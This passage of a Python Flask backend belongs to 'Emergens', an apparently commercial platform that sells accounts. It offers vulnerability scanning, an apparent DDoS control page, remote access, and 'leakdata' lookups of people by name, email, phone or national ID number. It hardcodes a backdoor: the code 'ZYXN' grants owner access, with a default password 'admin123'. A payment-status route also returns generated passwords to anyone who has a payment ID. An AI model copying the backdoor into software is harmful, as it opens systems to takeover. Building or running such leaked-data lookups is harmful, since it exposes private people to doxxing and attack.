            servers.append({
                "server_name": reported_name or f"Unnamed ({key_prefix})",
                "key_prefix": key_prefix,
                "ip": ip,
                "last_seen": _now_iso(),
                "requests": 1,
            })
        _save_json("servers", servers)


def _find_api_key_owner(raw_key: str) -> Optional[Dict[str, Any]]:
    try:
        keys = user_store.get_api_keys()
    except Exception:
        keys = []
    key_hash = _hash_api_key(raw_key)
    for k in keys:
        stored_hash = k.get("key_hash") or k.get("hash")
        if stored_hash and stored_hash == key_hash:
            return k
        if k.get("key") == raw_key:
            return k
    return None


def _api_key_required(fn):
    @wraps(fn)
    def wrapper(*args, **kwargs):
        raw_key = request.headers.get("X-API-Key", "").strip()
        if not raw_key:
            return jsonify({"error": "Missing X-API-Key header"}), 401
        record = _find_api_key_owner(raw_key)
        if not record:
            return jsonify({"error": "Invalid API key"}), 401
        prefix = record.get("prefix") or record.get("key_prefix") or raw_key[:20]
        owner = record.get("owner_username") or record.get("username") or "unknown"
        try:
            user_store.touch_api_key(prefix)
        except Exception:
            pass
        _record_server_activity(prefix, owner, request)
        g.api_key_owner = owner
        return fn(*args, **kwargs)
    return wrapper


# ═══════════════════════════════════════════════════════════════════════════
# Payment data
# ═══════════════════════════════════════════════════════════════════════════
PAYMENT_DATA_FILE = os.path.join(PROJECT_ROOT, "payment_data.json")
PAYMENT_PLANS_FILE = os.path.join(PROJECT_ROOT, "payment_plans.json")

_default_plans = {
    "free": {"name": "Free Plan", "price": "0.00"},
    "starter": {"name": "Starter Plan", "price": "9.00"},
    "standard": {"name": "Standard Plan", "price": "25.00"},
    "team": {"name": "Team Plan", "price": "49.00"},
    "enterprise": {"name": "Enterprise Plan", "price": "99.00"},
}
_payment_lock = threading.Lock()


def _load_plans() -> Dict[str, Any]:
    if os.path.exists(PAYMENT_PLANS_FILE):
        try:
            with open(PAYMENT_PLANS_FILE, "r") as f:
                return json.load(f)
        except (json.JSONDecodeError, IOError):
            logger.warning("Failed to load payment plans — using defaults")
    return _default_plans.copy()


def _save_plans(plans: Dict[str, Any]) -> bool:
    try:
        with _payment_lock:
            with open(PAYMENT_PLANS_FILE, "w") as f:
                json.dump(plans, f, indent=2)
        return True
    except IOError:
        logger.error("Failed to save payment plans")
        return False


def _load_payments() -> List[Dict[str, Any]]:
    if os.path.exists(PAYMENT_DATA_FILE):
        try:
            with open(PAYMENT_DATA_FILE, "r") as f:
                return json.load(f)
        except (json.JSONDecodeError, IOError):
            logger.warning("Failed to load payment data — starting empty")
    return []


def _save_payments(payments: List[Dict[str, Any]]) -> bool:
    try:
        with _payment_lock:
            with open(PAYMENT_DATA_FILE, "w") as f:
                json.dump(payments, f, indent=2)
        return True
    except IOError:
        logger.error("Failed to save payment data")
        return False


payment_plans = _load_plans()


# ═══════════════════════════════════════════════════════════════════════════
# Login rate limiting
# ═══════════════════════════════════════════════════════════════════════════
MAX_LOGIN_ATTEMPTS = 5
LOCKOUT_SECONDS = 300
_failed_attempts: Dict[str, List[float]] = defaultdict(list)
_failed_lock = threading.Lock()


def _is_locked_out(ip: str) -> bool:
    now = time.time()
    with _failed_lock:
        _failed_attempts[ip] = [t for t in _failed_attempts[ip]
                                 if now - t < LOCKOUT_SECONDS]
        return len(_failed_attempts[ip]) >= MAX_LOGIN_ATTEMPTS


def _record_failed_attempt(ip: str) -> None:
    with _failed_lock:
        _failed_attempts[ip].append(time.time())


# ═══════════════════════════════════════════════════════════════════════════
# OSINT rate limiting — per-IP token bucket
# ═══════════════════════════════════════════════════════════════════════════
_osint_buckets: Dict[str, Dict[str, float]] = defaultdict(
    lambda: {"tokens": float(OSINT_RATE_BURST), "last": time.monotonic()}
)
_osint_rate_lock = threading.Lock()


def _osint_take_token(ip: str) -> Tuple[bool, float]:
    """Token-bucket per IP. Returns (allowed, seconds_until_refill)."""
    with _osint_rate_lock:
        b = _osint_buckets[ip]
        now = time.monotonic()
        elapsed = now - b["last"]
        refill_rate = OSINT_RATE_PER_MIN / 60.0
        b["tokens"] = min(
            float(OSINT_RATE_BURST),
            b["tokens"] + elapsed * refill_rate,
        )
        b["last"] = now
        if b["tokens"] >= 1.0:
            b["tokens"] -= 1.0
            return True, 0.0
        wait = (1.0 - b["tokens"]) / refill_rate
        return False, round(wait, 2)


# ═══════════════════════════════════════════════════════════════════════════
# Auth decorators
# ═══════════════════════════════════════════════════════════════════════════
def _extract_bearer_token() -> str:
    auth = request.headers.get("Authorization", "")
    if auth.startswith("Bearer "):
        return auth[7:]
    return ""


def _authenticate_request() -> bool:
    username = session.get("username")
    if username:
        role = get_role(username)
        if role is None:
            session.clear()
        else:
            session["role"] = role
            return True

    token = _extract_bearer_token()
    if token:
        username = token_store.validate_token(token)
        if username:
            role = get_role(username)
            if role is None:
                return False
            session["authenticated"] = True
            session["username"] = username
            session["role"] = role
            session.permanent = True
            return True
    return False


def login_required(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        if not _authenticate_request():
            if request.path.startswith("/api/"):
                return jsonify({"error": "unauthorized"}), 401
            return redirect(f"/login.html?next={request.path}")
        return f(*args, **kwargs)
    return wrapper


def api_login_required(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        if not _authenticate_request():
            return jsonify({"error": "unauthorized"}), 401
        return f(*args, **kwargs)
    return wrapper


def role_required(*allowed_roles):
    def decorator(f):
        @wraps(f)
        def wrapper(*args, **kwargs):
            if not _authenticate_request():
                return jsonify({"error": "unauthorized"}), 401
            if session.get("role") not in allowed_roles:
                return jsonify({"error": "forbidden"}), 403
            return f(*args, **kwargs)
        return wrapper
    return decorator


def current_user() -> Optional[Dict[str, str]]:
    username = session.get("username")
    if not username:
        return None
    role = get_role(username)
    if role is None:
        return None
    return {"username": username, "role": role}


def owner_required(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        u = current_user()
        if not u:
            return jsonify({"error": "Not authenticated"}), 401
        if u.get("role") != "owner":
            return jsonify({"error": "Owner access required"}), 403
        return f(*args, **kwargs)
    return wrapper


# ═══════════════════════════════════════════════════════════════════════════
# Version endpoint
# ═══════════════════════════════════════════════════════════════════════════
@app.route("/api/version")
def api_version():
    return jsonify({
        "app": "Emergens",
        "version": BANNER_VERSION,
        "python": sys.version.split()[0],
        "server_started": SERVER_START_WALL,
        "uptime_seconds": int(time.monotonic() - SERVER_START_MONO),
        "modules": {
            "xss":      _xss_available,
            "sniper":   _sniper_available,
            "takeover": _takeover_available,
            "dirfuzz":  _dirfuzz_available,
            "http_logger": _http_logger_available,
            "analytic": _analytic_available,
            "testing":  _testing_available,
            "downsea":  _downsea_available,
            "quick_menu": _quick_menu_available,
            "osint":    _osint_available,
        },
        "osint": {
            "available": _osint_available,
            "standalone": _osint_standalone_ok,
            "note": _osint_standalone_msg,
        },
    })


# ═══════════════════════════════════════════════════════════════════════════
# Page routes
# ═══════════════════════════════════════════════════════════════════════════
@app.route("/")
def index():
    if _authenticate_request():
        return redirect("/dashboard.html")
    return render_template("get-started.html")


@app.route("/get-started.html")
def get_started_page():
    if _authenticate_request():
        return redirect("/dashboard.html")
    return render_template("get-started.html")


@app.route("/login.html")
def login_page():
    if _authenticate_request():
        return redirect("/dashboard.html")
    return render_template("login.html")


@app.route("/dashboard.html")
@login_required
def dashboard_page():
    return render_template(
        "dashboard.html",
        username=session.get("username", DEFAULT_USERNAME),
        role=session.get("role", "owner"),
    )


@app.route("/payment.html")
def payment_page():
    return render_template("payment.html")


@app.route("/management_payment.html")
@role_required("owner")
def management_payment_page():
    return render_template("management_payment.html")


@app.route("/api_key_request_token.html")
def api_key_request_token_page():
    return render_template("api_key_request_token.html")


@app.route("/api/api_key_request_token.html")
def api_key_request_token_api_page():
    return render_template("api_key_request_token.html")


@app.route("/downloader_pinterest_tiktok.html")
@login_required
def downloader_pinterest_tiktok_page():
    return render_template("downloader_pinterest_tiktok.html")


@app.route("/data_main.html")
@login_required
def data_main_redirect():
    return redirect("/downloader_pinterest_tiktok.html")


@app.route("/code_test.html")
def code_test_page():
    return render_template("code_test.html")


@app.route("/remote_access.html")
@login_required
def remote_access_page():
    return render_template("remote_access.html")


@app.route("/emergens-control-m4ddos.html")
@login_required
def emergens_control_m4ddos_page():
    return render_template("emergens-control-m4ddos.html")


@app.route("/MyEspT.html")
@login_required
def MyEspT_page():
    return render_template("MyEspT.html")


@app.route("/quick_menu_setting.html")
@login_required
def quick_menu_setting_page():
    return render_template("quick_menu_setting.html")


@app.route("/Emergens_osint.html")
@login_required
def emergens_osint_page():
    return render_template("Emergens_osint.html")


@app.route("/structure_folder_file.html")
@login_required
def structure_folder_file_page():
    return render_template("structure_folder_file.html")


@app.route("/password_lock.html")
def password_lock_page():
    return render_template("password_lock.html")


@app.route("/Emergens_DB.html")
@login_required
def emergens_db_page():
    return render_template("Emergens_DB.html")


@app.route("/docs.html")
@login_required
def docs_page():
    return render_template("docs.html")


@app.route("/privacy.html")
def privacy_page():
    return render_template("privacy.html")


@app.route("/terms.html")
def terms_page():
    return render_template("terms.html")


# ═══════════════════════════════════════════════════════════════════════════
# Static asset shortcut
# ═══════════════════════════════════════════════════════════════════════════
@app.route("/<path:filename>")
def serve_template_assets(filename):
    if not filename.endswith((".js", ".css")):
        return page_not_found(None)
    templates_dir = os.path.join(PROJECT_ROOT, "templates")
    safe_path = os.path.abspath(os.path.join(templates_dir, filename))
    if not safe_path.startswith(os.path.abspath(templates_dir)):
        return page_not_found(None)
    if os.path.isfile(safe_path):
        return send_from_directory(templates_dir, filename)
    return page_not_found(None)


# ═══════════════════════════════════════════════════════════════════════════
# Payment API
# ═══════════════════════════════════════════════════════════════════════════
@app.route("/api/payment/plans", methods=["GET"])
def get_payment_plans():
    global payment_plans
    payment_plans = _load_plans()
    return jsonify({"plans": payment_plans})


@app.route("/api/payment/submit", methods=["POST"])
def submit_payment():
    data = _json_body()
    plan = (data.get("plan") or "").strip()
    amount = (data.get("amount") or "").strip()
    payment_method = data.get("payment_method", "card")
    requested_username = (data.get("requested_username") or "").strip()
    card_last4 = data.get("card_number_last4", "")

    if not plan or not amount or not requested_username:
        return jsonify({"error": "plan, amount, and requested_username are required"}), 400
    plans = _load_plans()
    if plan not in plans:
        return jsonify({"error": "Invalid plan"}), 400
    if user_store.user_exists(requested_username):
        return jsonify({"error": "Username already taken"}), 400

    payment_id = "PAY-" + uuid.uuid4().hex[:10].upper()
    username = session.get("username", "guest")
    record = {
        "payment_id": payment_id,
        "user": username,
        "requested_username": requested_username,
        "plan": plan,
        "amount": amount,
        "payment_method": payment_method,
        "card_last4": card_last4,
        "status": "pending",
        "created_at": _now_iso(),
        "updated_at": _now_iso(),
        "generated_username": None,
        "generated_password": None,
    }
    payments = _load_payments()
    payments.append(record)
    _save_payments(payments)
    return jsonify({"payment_id": payment_id, "status": "pending"}), 201


@app.route("/api/payment/status/<payment_id>", methods=["GET"])
def get_payment_status(payment_id):
    payments = _load_payments()
    for record in payments:
        if record["payment_id"] == payment_id:
            if record["status"] == "approved" and record.get("generated_password"):
                return jsonify({
                    "payment_id": record["payment_id"],
                    "status": record["status"],
                    "generated_username": record["generated_username"],
                    "generated_password": record["generated_password"],
                    "plan": record["plan"],
                    "amount": record["amount"],
                })
            return jsonify({"payment_id": record["payment_id"],
                            "status": record["status"]})
    return jsonify({"error": "Payment not found"}), 404


@app.route("/api/payment/history", methods=["GET"])
def get_payment_history():
    user = session.get("username") if session.get("authenticated") else "guest"
    payments = _load_payments()
    user_payments = [p for p in payments if p["user"] == user]
    for p in user_payments:
        if not (p["status"] == "approved" and p.get("generated_password")
                and (p["user"] == session.get("username")
                     or session.get("role") == "owner")):
            p.pop("generated_password", None)
            p.pop("generated_username", None)
    return jsonify({"payments": user_payments})


@app.route("/api/payment/manage/plans", methods=["GET"])
@role_required("owner")
def manage_get_plans():
    return jsonify({"plans": _load_plans()})


@app.route("/api/payment/manage/plans", methods=["POST"])
@role_required("owner")
def manage_update_plans():
    data = _json_body()
    new_plans = data.get("plans")
    if not isinstance(new_plans, dict):
        return jsonify({"error": "Invalid plans format"}), 400
    global payment_plans
    payment_plans = new_plans
    if _save_plans(payment_plans):
        return jsonify({"success": True, "plans": payment_plans})
    return jsonify({"error": "Failed to save plans"}), 500


@app.route("/api/payment/manage/pending", methods=["GET"])
@role_required("owner")
def manage_list_pending():
    payments = _load_payments()
    pending = [p for p in payments if p["status"] == "pending"]
    return jsonify({"pending": pending})


@app.route("/api/payment/manage/all", methods=["GET"])
@role_required("owner")
def manage_list_all_payments():
    return jsonify({"payments": _load_payments()})


@app.route("/api/payment/manage/approve/<payment_id>", methods=["POST"])
@role_required("owner")
def manage_approve_payment(payment_id):
    payments = _load_payments()
    for record in payments:
        if record["payment_id"] == payment_id:
            if record["status"] != "pending":
                return jsonify({"error": "Payment already processed"}), 400
            generated_password = uuid.uuid4().hex[:12]
            try:
                create_user(record["requested_username"], role="analyst",
                            password=generated_password)
                record["generated_username"] = record["requested_username"]
                record["generated_password"] = generated_password
                record["status"] = "approved"
                record["updated_at"] = _now_iso()
                _save_payments(payments)
                logger.info("Payment %s approved → user %s created",
                             payment_id, record["requested_username"])
                return jsonify({
                    "success": True,
                    "payment_id": record["payment_id"],
                    "generated_username": record["generated_username"],
                    "generated_password": record["generated_password"],
                    "role": "analyst",
                })
            except Exception as e:
                logger.error("Failed to create user for payment %s: %s",
                              payment_id, e)
                return jsonify({"error": f"User creation failed: {e}"}), 500
    return jsonify({"error": "Payment not found"}), 404


@app.route("/api/payment/manage/reject/<payment_id>", methods=["POST"])
@role_required("owner")
def manage_reject_payment(payment_id):
    payments = _load_payments()
    for record in payments:
        if record["payment_id"] == payment_id:
            if record["status"] != "pending":
                return jsonify({"error": "Payment already processed"}), 400
            record["status"] = "rejected"
            record["updated_at"] = _now_iso()
            _save_payments(payments)
            return jsonify({"success": True})
    return jsonify({"error": "Payment not found"}), 404


# ═══════════════════════════════════════════════════════════════════════════
# ADB login
# ═══════════════════════════════════════════════════════════════════════════
ADB_ACCESS_CODE = "ZYXN"
ADB_USERNAME = "Yanxzyx"
ADB_ROLE = "owner"


@app.route("/api/adb_login", methods=["POST"])
def api_adb_login():
    data = _json_body()
    code = (data.get("code") or "").strip().upper()
    if not code:
        return jsonify({"error": "code_required"}), 400
    if code != ADB_ACCESS_CODE:
        _record_failed_attempt(_client_ip())
        return jsonify({"error": "invalid_code"}), 401
    if not user_store.user_exists(ADB_USERNAME):
        try:
            create_user(ADB_USERNAME, role=ADB_ROLE, password="admin123")
        except ValueError:
            pass
    session["authenticated"] = True
    session["username"] = ADB_USERNAME
    session["role"] = ADB_ROLE
    session.permanent = True
    return jsonify({"success": True, "username": ADB_USERNAME,
                    "role": ADB_ROLE})


# ═══════════════════════════════════════════════════════════════════════════
# Auth API
# ═══════════════════════════════════════════════════════════════════════════
@app.route("/api/login", methods=["POST"])
def api_login():
    ip = _client_ip()
    if _is_locked_out(ip):
        return jsonify({"error": "too_many_attempts"}), 429
    data = _json_body()
    username = (data.get("username") or "").strip()
    password = data.get("password") or ""
    if verify_credentials(username, password):
        session["authenticated"] = True
        session["username"] = username
        session["role"] = get_role(username)
        session.permanent = True
        return jsonify({"success": True})
    _record_failed_attempt(ip)
    return jsonify({"error": "invalid_credentials"}), 401


@app.route("/api/logout", methods=["POST"])
def api_logout():
    token = _extract_bearer_token()
    if token:
        token_store.revoke_token(token[:8])
    session.clear()
    return jsonify({"success": True})


@app.route("/api/token", methods=["POST"])
def api_get_token():
    data = _json_body()
    username = (data.get("username") or data.get("address") or "").strip()
    password = data.get("password") or ""
    if not username or not password:
        return jsonify({"error": "username_and_password_required"}), 400
    token = token_store.generate_token(
        username, password,
        user_agent=request.headers.get("User-Agent", ""),
    )
    if token is None:
        return jsonify({"error": "invalid_credentials"}), 401
    return jsonify({
        "token": token,
        "token_prefix": token[:8] + "****",
        "expires_in": 3600,
        "username": username,
        "role": get_role(username),
    })


@app.route("/api/me")
@api_login_required
def api_me():
    return jsonify({"username": session.get("username"),
                    "role": session.get("role")})


# ═══════════════════════════════════════════════════════════════════════════
# Register API
# ═══════════════════════════════════════════════════════════════════════════
def _is_valid_email(email: str) -> bool:
    real_email = re.match(r"^[^@\s]+@[^@\s]+\.[^@\s]+$", email)
    emergens_email = re.match(r"^[a-zA-Z0-9._-]+@emergens\.id$", email)
    return bool(real_email or emergens_email)


@app.route("/api/register", methods=["POST"])
def api_register():
    data = _json_body()
    name = (data.get("name") or "").strip()
    email = (data.get("email") or "").strip().lower()
    username = (data.get("username") or "").strip()
    password = data.get("password") or ""
    if not name or not email or not username or not password:
        return jsonify({"error": "all_fields_required"}), 400
    if len(name) < 2:
        return jsonify({"error": "name_too_short"}), 400
    if not _is_valid_email(email):
        return jsonify({"error": "invalid_email"}), 400
    if len(username) < 3:
        return jsonify({"error": "username_too_short"}), 400
    if len(password) < 8:
        return jsonify({"error": "password_too_short"}), 400
    if user_store.user_exists(username):
        return jsonify({"error": "username_taken"}), 400
    try:
        create_user(username, role="analyst", password=password)
        return jsonify({"success": True, "username": username,
                        "role": "analyst", "email": email, "name": name})
    except ValueError as e:
        return jsonify({"error": str(e)}), 400
    except Exception as e:
        logger.error("Registration failed: %s", e)
        return jsonify({"error": "registration_failed"}), 500


# ═══════════════════════════════════════════════════════════════════════════
# Settings / Account management
# ═══════════════════════════════════════════════════════════════════════════
@app.route("/api/settings/users")
@role_required("owner")
def api_list_users():
    return jsonify(list_users())


@app.route("/api/settings/create-account", methods=["POST"])
@role_required("owner")
def api_create_account():
    data = _json_body()
    username = (data.get("username") or "").strip()
    role = data.get("role") or ""
    if not username:
        return jsonify({"error": "username_required"}), 400
    if role not in VALID_ROLES:
        return jsonify({"error": "invalid_role"}), 400
    try:
        password = create_user(username, role=role)
    except ValueError as e:
        return jsonify({"error": str(e)}), 400
    return jsonify({"username": username, "password": password,
                    "role": role})


@app.route("/api/settings/users/<username>", methods=["DELETE"])
@role_required("owner")
def api_delete_user(username):
    if username == session.get("username"):
        return jsonify({"error": "cannot delete your own account"}), 400
    ok, err = delete_user(username)
    if not ok:
        return jsonify({"error": err}), 400
    token_store.revoke_all_user_tokens(username)
    return jsonify({"success": True})


# ═══════════════════════════════════════════════════════════════════════════
# API Key management
# ═══════════════════════════════════════════════════════════════════════════
@app.route("/api/settings/api-keys")
@role_required("owner", "analyst")
def api_list_api_keys():
    keys = user_store.get_api_keys()
    return jsonify([_public_key_view(k) for k in keys])


@app.route("/api/settings/api-keys", methods=["POST"])
@role_required("owner", "analyst")
def api_generate_api_key():
    role = session.get("role", "")
    if role == "analyst" and len(user_store.get_api_keys()) >= 2:
        return jsonify({"error": "api_key_limit_reached", "limit": 2}), 403
    key = user_store.generate_api_key(session.get("username"))
    return jsonify({"key": key, "prefix": key[:20] + "****"})


@app.route("/api/settings/api-keys/<prefix>", methods=["DELETE"])
@role_required("owner", "analyst")
def api_revoke_api_key(prefix):
    if user_store.revoke_api_key(prefix):
        return jsonify({"success": True})
    return jsonify({"error": "not_found"}), 404


# ═══════════════════════════════════════════════════════════════════════════
# Tools / Scan API
# ═══════════════════════════════════════════════════════════════════════════
@app.route("/api/tools")
@api_login_required
def api_tools():
    tools = {
        name: info
        for name, info in scan_orchestrator.list_tools().items()
        if "school" not in name.lower()
    }
    return jsonify(tools)


@app.route("/api/scan/start", methods=["POST"])
@role_required("owner", "analyst")
def api_scan_start():
    data = _json_body()
    target = (data.get("target") or "").strip()
    mode = data.get("mode", "basic")
    tools = data.get("tools", [])
    if not target:
        return jsonify({"error": "target_required"}), 400
    if mode not in ("basic", "expert"):
        mode = "basic"
    job_id = scan_orchestrator.start_scan(target, mode, tools, history_store)
    return jsonify({"job_id": job_id})


@app.route("/api/scan/<job_id>/status")
@api_login_required
def api_scan_status(job_id):
    progress = scan_orchestrator.get_progress(job_id)
    if progress is None:
        return jsonify({"error": "not_found"}), 404
    return jsonify(progress)


@app.route("/api/scan/<job_id>/cancel", methods=["POST"])
@role_required("owner", "analyst")
def api_scan_cancel(job_id):
    ok = scan_orchestrator.cancel_scan(job_id)
    if not ok:
        return jsonify({"error": "not_found_or_already_finished"}), 404
    return jsonify({"success": True, "job_id": job_id})


@app.route("/api/scan/<tool_name>", methods=["POST"])
@role_required("owner", "analyst")
def api_scan_tool_direct(tool_name):
    if tool_name not in TOOL_MAP:
        return jsonify({"error": "unknown_tool",
                        "available": list(TOOL_MAP.keys())}), 404
    data = _json_body()
    target = (data.get("target") or "").strip()
    mode = data.get("mode", "basic")
    if not target:
        return jsonify({"error": "target_required"}), 400
    if mode not in ("basic", "expert"):
        mode = "basic"
    try:
        return jsonify(TOOL_MAP[tool_name].run(target, mode))
    except Exception as e:
        return jsonify({"error": "tool_execution_failed",
                        "detail": str(e)}), 500


@app.route("/api/scan/metrics")
@login_required
def api_scan_metrics():
    return jsonify(scan_orchestrator.metrics())


@app.route("/api/scan/jobs")
@login_required
def api_scan_jobs():
    status = request.args.get("status") or None
    try:
        limit = min(int(request.args.get("limit", 50)), 500)
    except (TypeError, ValueError):
        limit = 50
    return jsonify({"jobs": scan_orchestrator.list_jobs(status=status,
                                                         limit=limit)})


@app.route("/api/scan/jobs/snapshot")
@login_required
def api_scan_snapshot():
    return jsonify(scan_orchestrator.snapshot())


@app.route("/api/scan/jobs/cancel-all", methods=["POST"])
@role_required("owner", "analyst")
def api_scan_cancel_all():
    n = scan_orchestrator.cancel_all()
    return jsonify({"success": True, "cancelled": n})


# ═══════════════════════════════════════════════════════════════════════════
# OSINT — Standalone search (excluded from scan pipeline)
# ═══════════════════════════════════════════════════════════════════════════
def _osint_validate(method: str, query: str) -> Optional[str]:
    if not query:
        return "query_required"
    if len(query) < OSINT_MIN_QUERY_LEN:
        return "query_too_short"
    if len(query) > OSINT_MAX_QUERY_LEN:
        return "query_too_long"
    if method == "email" and not re.match(
            r"^[^\s@]+@[^\s@]+\.[^\s@]{2,}$", query):
        return "invalid_email"
    if method == "number":
        digits = re.sub(r"\D", "", query)
        if not (6 <= len(digits) <= 20):
            return "invalid_phone"
    if method == "nik":
        digits = re.sub(r"\D", "", query)
        if len(digits) < 8:
            return "invalid_nik"
    return None


@app.route("/api/osint/search", methods=["POST"])
@login_required
def osint_search():
    """
    Standalone OSINT lookup — routed away from the scan pipeline.

    Body:
        { "query": "johndoe", "method": "username",
          "limit": 50, "offset": 0, "minScore": 0.3, "exact": false }

    Response:
        { "tool": "osint", "method": "...", "query": "...",
          "target": "...", "standalone": true,
          "data": { "results": [...], "count": N, "total": N,
                    "offset": 0, "limit": 50, "tookMs": N } }
    """
    if not _osint_available or osint_module is None:
        return jsonify({
            "error": "osint_unavailable",
            "detail": _OSINT_IMPORT_ERROR if not _osint_available else "module missing",
        }), 503

    ip = _client_ip()
    allowed, wait_s = _osint_take_token(ip)
    if not allowed:
        osint_logger.warning("OSINT rate-limited for %s (retry in %.2fs)",
                              ip, wait_s)
        return jsonify({
            "error": "rate_limited",
            "retry_after": wait_s,
            "limit_per_min": OSINT_RATE_PER_MIN,
        }), 429

    body = _json_body()
    method = (body.get("method") or "name").strip().lower()
    query = (body.get("query") or body.get("target") or "").strip()

    if method not in OSINT_VALID_METHODS:
        method = "any"

    err = _osint_validate(method, query)
    if err:
        return jsonify({"error": err,
                        "method": method,
                        "query": query}), 400

    # Option normalisation
    try:
        limit = max(1, min(1000, int(body.get("limit", 50))))
        offset = max(0, int(body.get("offset", 0)))
    except (TypeError, ValueError):
        return jsonify({"error": "invalid_pagination"}), 400

    min_score = body.get("minScore", body.get("min_score"))
    if min_score is not None:
        try:
            min_score = max(0.0, min(1.0, float(min_score)))
        except (TypeError, ValueError):
            return jsonify({"error": "invalid_min_score"}), 400

    exact = bool(body.get("exact", False))

    try:
        result = osint_module.run(
            query,
            mode="basic",
            method=method,
            limit=limit,
            offset=offset,
            minScore=min_score,
            exact=exact,
        )
    except Exception as exc:
        osint_logger.exception("OSINT engine raised for %r/%r", method, query)
        return jsonify({
            "error": "osint_engine_error",
            "detail": str(exc),
        }), 500

    # Normalise envelope so the JS client always sees the same shape
    data = result.get("data") or {}
    envelope = {
        "tool": result.get("tool", "osint"),
        "method": result.get("method", method),
        "query": result.get("query", query),
        "target": result.get("target", query),
        "standalone": True,
        "data": {
            "results": data.get("results", []),
            "count": data.get("count", 0),
            "total": data.get("total", data.get("count", 0)),
            "offset": data.get("offset", offset),
            "limit": data.get("limit", limit),
            "tookMs": data.get("tookMs"),
        },
    }
    if result.get("error"):
        envelope["error"] = result["error"]
        envelope["message"] = result.get("message")

    osint_logger.info(
        "OSINT %s · %r → %d/%d results (%.1fms) · user=%s ip=%s",
        method, query,
        envelope["data"]["count"], envelope["data"]["total"],
        envelope["data"]["tookMs"] or 0,
        session.get("username"), ip,
    )
    return jsonify(envelope)


@app.route("/api/osint/stats")
@login_required
def osint_stats():
    """Return cache + config stats for the OSINT engine."""
    if not _osint_available or osint_module is None:
        return jsonify({"error": "osint_unavailable"}), 503
    try:
        return jsonify(osint_module.stats())
    except Exception as exc:
        return jsonify({"error": "stats_failed", "detail": str(exc)}), 500


@app.route("/api/osint/cache/clear", methods=["POST"])
@login_required
def osint_clear_cache():
    if not _osint_available or osint_module is None:
        return jsonify({"error": "osint_unavailable"}), 503
    try:
        osint_module.clear_cache()
        return jsonify({"success": True})
    except Exception as exc:
        return jsonify({"error": "clear_failed", "detail": str(exc)}), 500


# Legacy alias — keeps older clients working
@app.route("/api/leakdata/search", methods=["GET", "POST"])
@api_login_required
def api_leakdata_search():
    if request.method == "POST":
        data = _json_body()
        target = data.get("target") or data.get("query") or ""
        method = data.get("method") or "name"
    else:
        target = request.args.get("q", "")
        method = request.args.get("method", "name")
    target = (target or "").strip()
    if not target:
        return jsonify({"error": "query_required"}), 400
    if not _osint_available or osint_module is None:
        return jsonify({"error": "osint_unavailable"}), 503
    try:
        return jsonify(osint_module.run(target, mode="basic", method=method))
    except Exception as e:
        return jsonify({"error": "search_failed", "detail": str(e)}), 500


# ═══════════════════════════════════════════════════════════════════════════
# History API
# ═══════════════════════════════════════════════════════════════════════════
@app.route("/api/history")
@api_login_required
def api_history():
    return jsonify(history_store.list_all())


@app.route("/api/history/<int:entry_id>")
@api_login_required
def api_history_detail(entry_id):
    entry = history_store.get(entry_id)
    if entry is None:
        return jsonify({"error": "not_found"}), 404
    return jsonify(entry)


@app.route("/api/history/<int:entry_id>", methods=["DELETE"])
@role_required("owner", "analyst")
def api_history_delete(entry_id):
    history_store.delete(entry_id)
    return jsonify({"success": True})


# ═══════════════════════════════════════════════════════════════════════════
# System stats / logs / network traffic
# ═══════════════════════════════════════════════════════════════════════════
@app.route("/api/system/stats")
@api_login_required
def api_system_stats():
    total_seen, last_minute = _inbound_stats()
    try:
        cpu = psutil.cpu_percent(interval=0.1)
        mem = psutil.virtual_memory().percent
        disk = psutil.disk_usage("/").percent
    except Exception as e:
        logger.error("psutil read failed: %s", e)
        cpu = mem = disk = 0.0
    return jsonify({
        "cpu_percent": cpu,
        "memory_percent": mem,
        "disk_percent": disk,
        "network_in": total_seen,
        "network_in_rate": last_minute,
        "uptime_seconds": int(time.monotonic() - SERVER_START_MONO),
    })


@app.route("/api/network/traffic", methods=["GET"])
@api_login_required
def api_network_traffic():
    total_seen, last_minute = _inbound_stats()
    now = time.time()
    uptime = max(1.0, now - _net_traffic_started_at)
    prev_t = _prev_net_counters["t"] or now
    prev_total = _prev_net_counters["total"]
    dt = max(0.001, now - prev_t)
    delta = max(0, total_seen - prev_total)
    req_per_sec = delta / dt
    _prev_net_counters["t"] = now
    _prev_net_counters["total"] = total_seen

    try:
        net = psutil.net_io_counters()
        bytes_sent = net.bytes_sent
        bytes_recv = net.bytes_recv
        packets_sent = net.packets_sent
        packets_recv = net.packets_recv
    except Exception as exc:
        logger.warning("psutil.net_io_counters failed: %s", exc)
        bytes_sent = bytes_recv = packets_sent = packets_recv = 0

    return jsonify({
        "requests_total": total_seen,
        "requests_last_minute": last_minute,
        "requests_per_second": round(req_per_sec, 2),
        "uptime_seconds": int(uptime),
        "bytes_sent": bytes_sent,
        "bytes_recv": bytes_recv,
        "packets_sent": packets_sent,
        "packets_recv": packets_recv,
        "network_in": total_seen,
        "network_in_rate": last_minute,
        "inbound": last_minute,
        "outbound": 0,
        "timestamp": _now_iso(),
    })


@app.route("/api/logs")
@api_login_required
def api_logs():
    lines = int(request.args.get("lines", 100))
    try:
        with open(Config.SERVER_LOG_FILE, "r") as f:
            content = f.readlines()[-lines:]
        return jsonify({"lines": [c.rstrip("\n") for c in content]})
    except FileNotFoundError:
        return jsonify({"lines": []})


# ═══════════════════════════════════════════════════════════════════════════
# Source viewer
# ═══════════════════════════════════════════════════════════════════════════
@app.route("/api/fetch-source", methods=["POST"])
@api_login_required
def api_fetch_source():
    data = _json_body()
    url = (data.get("url") or "").strip()
    extract = data.get("extract", False)
    if not url:
        return jsonify({"error": "url_required"}), 400
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    try:
        result = fetch_source(url, extract=extract)
    except Exception as e:
        return jsonify({"error": "fetch_failed", "detail": str(e)}), 500
    if "error" in result:
        return jsonify(result), 500
    return jsonify(result)


# ═══════════════════════════════════════════════════════════════════════════
# AI Chat
# ═══════════════════════════════════════════════════════════════════════════
@app.route("/api/chat", methods=["POST"])
@role_required("owner", "analyst")
def api_chat():
    data = _json_body()
    return jsonify(chat_handler.send(data.get("message", "")))


@app.route("/api/chat/history")
@api_login_required
def api_chat_history():
    return jsonify(chat_handler.get_history())


@app.route("/api/chat/clear", methods=["POST"])
@role_required("owner", "analyst")
def api_chat_clear():
    chat_handler.clear_history()
    return jsonify({"success": True})


# ═══════════════════════════════════════════════════════════════════════════
# School search
# ═══════════════════════════════════════════════════════════════════════════
@app.route("/api/school/search")
@api_login_required
def api_school_search():
    try:
